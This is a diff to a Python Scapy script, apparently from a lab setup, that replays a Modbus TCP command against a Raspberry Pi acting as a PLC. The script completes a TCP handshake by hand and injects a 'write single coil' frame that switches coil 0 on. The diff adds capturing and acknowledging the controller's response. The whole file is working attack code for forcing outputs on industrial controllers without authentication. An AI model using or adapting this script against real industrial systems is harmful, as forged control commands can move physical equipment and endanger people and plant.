@@ -1,3 +1,6 @@
+"""
+
+"""
 #Libraries
 from scapy.all import *
 from scapy.layers.inet import *
@@ -5,6 +8,8 @@ from scapy.layers.inet import *
 # Hardcoded values: PLC (RPI)
 MODBUS_SERVER_IP = "192.168.68.117"
 MODBUS_PORT = 502
+# variable
+sport = RandShort()
 
 """
 Modbus TCP Replay Payload
@@ -26,22 +31,47 @@ b' => indicates its in bytes
 
 modbus_payload = b'\x00\x01\x00\x00\x00\x06\x01\x05\x00\x00\xff\x00'
 
-# Random source port
-sport = RandShort()
-
-# IP and initial TCP SYN
+# TCP/IP setup
 ip = IP(dst=MODBUS_SERVER_IP)
 syn = TCP(sport=sport, dport=MODBUS_PORT, flags="S", seq=1000)
 syn_ack = sr1(ip/syn, timeout=2)
 
 if syn_ack and syn_ack.haslayer(TCP) and syn_ack[TCP].flags == "SA":
-    ack = TCP(sport=sport, dport=MODBUS_PORT, flags="A", seq=syn_ack.ack, ack=syn_ack.seq + 1)
+    my_seq = syn_ack.ack
+    my_ack = syn_ack.seq + 1
+
+    # ACK the SYN-ACK
+    ack = TCP(sport=sport, dport=MODBUS_PORT, flags="A", seq=my_seq, ack=my_ack)
     send(ip/ack)
 
-    # Now send PSH+ACK with payload
-    psh = TCP(sport=sport, dport=MODBUS_PORT, flags="PA", seq=syn_ack.ack, ack=syn_ack.seq + 1)
+    # Send the Modbus payload (PSH+ACK)
+    psh = TCP(sport=sport, dport=MODBUS_PORT, flags="PA", seq=my_seq, ack=my_ack)
     send(ip/psh/Raw(load=modbus_payload))
 
-    print("Modbus payload sent.")
+    # Wait for server's response
+    def filter_response(pkt):
+        return (pkt.haslayer(TCP)
+                and pkt[IP].src == MODBUS_SERVER_IP
+                and pkt[TCP].sport == MODBUS_PORT
+                and pkt[TCP].dport == sport)
+
+    print("Waiting for Modbus response")
+    response = sniff(lfilter=filter_response, count=1, timeout=3)
+    if response:
+        response[0].show()
+
+        # ACK the response (required by some stacks!)
+        resp_seq = response[0][TCP].seq
+        resp_ack = response[0][TCP].ack
+        payload_len = len(response[0][Raw].load) if response[0].haslayer(Raw) else 0
+        final_ack = TCP(sport=sport, dport=MODBUS_PORT, flags="A",
+                        seq=my_seq + len(modbus_payload),
+                        ack=resp_seq + payload_len)
+        send(ip/final_ack)
+
+        print("Response acknowledged.")
+    else:
+        print("No response received (timeout)")
+
 else:
-    print("Failed to complete TCP handshake — is the Modbus server reachable?")
+    print("TCP handshake failed. Check if Modbus server is online.")
